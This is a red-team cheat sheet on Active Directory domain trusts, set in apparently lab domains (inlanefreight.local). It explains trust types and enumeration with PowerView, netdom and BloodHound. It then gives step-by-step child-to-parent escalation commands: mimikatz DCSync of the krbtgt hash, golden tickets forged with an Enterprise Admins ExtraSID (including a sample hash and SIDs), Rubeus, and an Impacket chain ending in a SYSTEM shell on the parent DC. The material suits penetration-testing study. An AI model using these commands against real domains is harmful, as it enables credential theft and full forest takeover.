**Domain Trusts – Cheat Sheet (Red Team Lens)**

---

### 1. What a Trust Actually Is

* A **trust** = a link between two domains/forests’ authentication systems.
* It lets users in **Domain A** access resources in **Domain B** (depending on direction & type).
* Big picture: a weak/neglected domain with a trust to the main corp domain = **backdoor into the main org**.

---

### 2. Common Trust Types

Within / across forests:

* **Parent–Child (intra-forest)**

  * Child domain ↔ parent domain.
  * **Two-way, transitive** by default.
  * Example: `corp.inlanefreight.local` ↔ `inlanefreight.local`.

* **Cross-Link**

  * Trust between **child domains** to speed authentication.
  * Still within same forest.

* **Tree-Root**

  * New tree root domain added to same forest.
  * **Two-way, transitive** between forest root and new tree root.

* **Forest Trust**

  * Between **forest root domains** of two forests.
  * Transitive across each forest (if configured as such).

* **External Trust**

  * Between two domains in different forests **without** a forest trust.
  * **Non-transitive**. Often used for legacy or specific cross-org access.
  * Typically uses **SID filtering**.

* **ESAE / Bastion Forest**

  * Separate “hardened” forest used to manage production AD.

---

### 3. Transitive vs Non-Transitive

* **Transitive**

  * Trust extends further than the immediate partner.
  * If A trusts B and B trusts C **transitively**, A implicitly trusts C.
  * Used by: **forest, tree-root, parent-child, cross-link**.

* **Non-Transitive**

  * Trust applies **only** between the two domains directly.
  * Does **not** extend to the child/grandchild domains.
  * Typical for: **external** or custom trusts.

**Analogy:**

* Transitive = anyone in your household can sign for your package.
* Non-transitive = only *you* can sign, no one else.

---

### 4. One-Way vs Two-Way (Direction)

* **One-way trust**

  * **Trusted → Trusting**:

    * Users in **trusted** domain can access resources in **trusting** domain.
    * The reverse is not allowed.

* **Two-way / Bidirectional**

  * Both domains trust each other.
  * Users in each domain can access resources in the other.
  * Example: `INLANEFREIGHT.LOCAL` ↔ `FREIGHTLOGISTICS.LOCAL` (bidirectional).

---

### 5. Why This Matters for Attacks

* Trusts are often:

  * Created for **M&A / MSP / partner** relationships.
  * Never **security-reviewed** after initial setup.
* Common pattern:

  * Main domain is hardened.
  * A **child or partner domain** is weaker (old configs, bad passwords, vulnerable services).
  * You compromise that weaker domain → use trust to pivot into **primary domain**.
* Practical impact:

  * You might not get a foothold in `INLANEFREIGHT.LOCAL` directly…
  * …but `LOGISTICS.INLANEFREIGHT.LOCAL` or `FREIGHTLOGISTICS.LOCAL` might be soft.
  * Kerberoasting / ASREPRoasting / misconfigs there can give you **admins in the main domain**.

---

### 6. Enumerating Trusts (Windows-Built-In & PowerView)

#### 6.1 Built-in AD Module (`Get-ADTrust`)

```powershell
Import-Module ActiveDirectory
Get-ADTrust -Filter *
```

Gives you for each trust:

* `Source` (current domain)
* `Target` (trusted/trusting domain)
* `Direction` (BiDirectional / Inbound / Outbound)
* `IntraForest`, `ForestTransitive`, trust type, SID filtering flags, etc.

Look for:

* `Direction : BiDirectional`
* `ForestTransitive : True` (forest trust)
* `IntraForest : True/False` (child domain vs separate forest).

---

#### 6.2 PowerView

**Basic trust list:**

```powershell
Get-DomainTrust
```

**Full trust mapping:**

```powershell
Get-DomainTrustMapping
```

PowerView will show:

* `SourceName` / `TargetName`
* `TrustDirection` (Bidirectional / Inbound / Outbound)
* `TrustAttributes` (`WITHIN_FOREST`, `FOREST_TRANSITIVE`, etc.)
* Creation/changed timestamps.

**Enumerate objects across trust:**

```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

If you can query users/SPNs/etc in the trusted domain, that trust is **usable** for attacks.

---

#### 6.3 `netdom` (Classic Windows Tool)

List trusts:

```cmd
netdom query /domain:inlanefreight.local trust
```

List DCs:

```cmd
netdom query /domain:inlanefreight.local dc
```

List workstations/servers:

```cmd
netdom query /domain:inlanefreight.local workstation
```

Useful when you don’t have PowerView but do have domain-joined Windows host + RSAT.

---

#### 6.4 BloodHound

* Use **“Map Domain Trusts”** pre-built query.
* You’ll see domain nodes with edges like:

  * `INLANEFREIGHT.LOCAL` → `LOGISTICS.INLANEFREIGHT.LOCAL`
  * `INLANEFREIGHT.LOCAL` → `FREIGHTLOGISTICS.LOCAL`
* Quickly shows:

  * Which domains exist.
  * Direction and type of trusts.
  * How many hops you might need to move between them.

---

### 7. Operational Notes (Reporting / ROE)

* Always verify **in-scope domains** before attacking across trusts.
* For reporting, highlight:

  * Where a **weaker** domain can be used to compromise the **main** environment.
  * Any **bidirectional** trusts with unknown or untested security posture.
  * Realistic attack paths (e.g., Kerberoasting in trusted domain → admin in primary).


---

## **Attacking Domain Trusts – Child → Parent (Quick Cheatsheet Continuation)**

### **SID History Abuse (ExtraSIDs) – Summary**

* Child → Parent compromise hinges on abusing **sidHistory**.
* Injecting a privileged SID (e.g., **Enterprise Admins**) into a forged ticket lets a compromised **child-domain account** act as a **forest admin**.
* Works because **SID Filtering is NOT applied within the same forest**.

---

### **Requirements for ExtraSIDs Attack**

You need:

* Child domain KRBTGT **NT hash**
* Child domain **SID**
* Parent domain **Enterprise Admins SID**
* Child domain **FQDN**
* Any username (real or fake)

---

### **Commands (Minimal Edition)**

#### **1. DCSync KRBTGT Hash**

```powershell
mimikatz # lsadump::dcsync /user:CHILDDOMAIN\krbtgt
```

#### **2. Get Child Domain SID**

```powershell
Get-DomainSID
```

#### **3. Get Enterprise Admins SID**

```powershell
Get-DomainGroup -Domain ROOTDOMAIN -Identity "Enterprise Admins"
```

---

### **4. Create Golden Ticket (Mimikatz)**

```powershell
mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL `
/sid:<child-domain-sid> /krbtgt:<krbtgt-hash> `
/sids:<enterprise-admins-sid> /ptt

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### **5. Verify Ticket**

```powershell
klist
```

### **6. Test Parent-Domain Access**

```powershell
ls \\PARENT-DC\c$
```

---

## **ExtraSIDs (Rubeus Version)**

```powershell
.\Rubeus.exe golden /rc4:<krbtgt-hash> /domain:CHILD.DOMAIN.LOCAL `
/sid:<child-sid> /sids:<enterprise-admin-sid> /user:hacker /ptt
```

---

## **Full Compromise Test: DCSync Parent Domain**

```powershell
mimikatz # lsadump::dcsync /user:PARENT\Administrator
```

If this works → **you own the forest**.

---

## **Key Takeaway**

Once the **child domain is popped**, forging a ticket with the parent’s **Enterprise Admin SID** instantly escalates privileges across the trust. This is one of the fastest paths to **full forest compromise**.

---


## **Attacking Domain Trusts – Child → Parent (Linux Edition)**

*(Short, tactical, ready for the field)*

---

# **Child → Parent Trust Abuse from Linux (Quick Cheatsheet)**

### **What You Need**

* ✔ KRBTGT NT hash (child domain)
* ✔ Child domain SID
* ✔ Any username (real or fake)
* ✔ Child domain FQDN
* ✔ Parent domain Enterprise Admins SID

---

## **1. DCSync KRBTGT Hash (Child Domain)**

```bash
secretsdump.py child.local/admin@CHILD-DC-IP -just-dc-user CHILD/krbtgt
```

Extract the **NT hash** (used with `-nthash` in ticketer).

---

## **2. Brute-Force/Enumerate Child Domain SID**

```bash
lookupsid.py child.local/user@CHILD-DC-IP | grep "Domain SID"
```

Output Example:

```
[*] Domain SID is: S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX
```

---

## **3. Get Enterprise Admins SID (Parent Domain)**

```bash
lookupsid.py parent.local/user@PARENT-DC-IP | grep -B12 "Enterprise Admins"
```

Append `-519` RID to the parent SID.

---

## **4. Forge Golden Ticket (ticketer.py)**

```bash
ticketer.py \
  -nthash <KRBTGT_NT_HASH> \
  -domain CHILD.LOCAL \
  -domain-sid <CHILD_DOMAIN_SID> \
  -extra-sid <PARENT_DOMAIN_ENTERPRISE_ADMINS_SID> \
  hacker
```

Saves: **hacker.ccache**

---

## **5. Use the Golden Ticket**

```bash
export KRB5CCNAME=hacker.ccache
```

---

## **6. Test Authentication Into Parent Domain**

```bash
psexec.py CHILD.LOCAL/hacker@PARENT-DC-FQDN -k -no-pass -target-ip PARENT-DC-IP
```

If successful:

```
nt authority/system
```

🎉 **Parent Domain compromised. Full Enterprise Admin privilege.**

---

# **Automated Option (raiseChild.py)**

```bash
raiseChild.py -target-exec PARENT-DC-IP CHILD.LOCAL/admin
```

Performs automatically:

* Gets child + parent domain info
* Retrieves KRBTGT hashes
* Builds Golden Ticket
* Injects ExtraSIDs
* Logs into parent domain
* Dumps admin creds
* Optionally spawns SYSTEM shell

**BUT:** Use manual steps whenever possible — safer in production, easier to troubleshoot.

---

# **Workflow Summary (1-Page Memory Aid)**

1️⃣ **DCSync → KRBTGT (child)**
2️⃣ **lookupsid → Child SID**
3️⃣ **lookupsid → Parent EA SID**
4️⃣ **ticketer → Golden Ticket w/ ExtraSIDs**
5️⃣ **export KRB5CCNAME**
6️⃣ **psexec → Pop Parent DC**

---
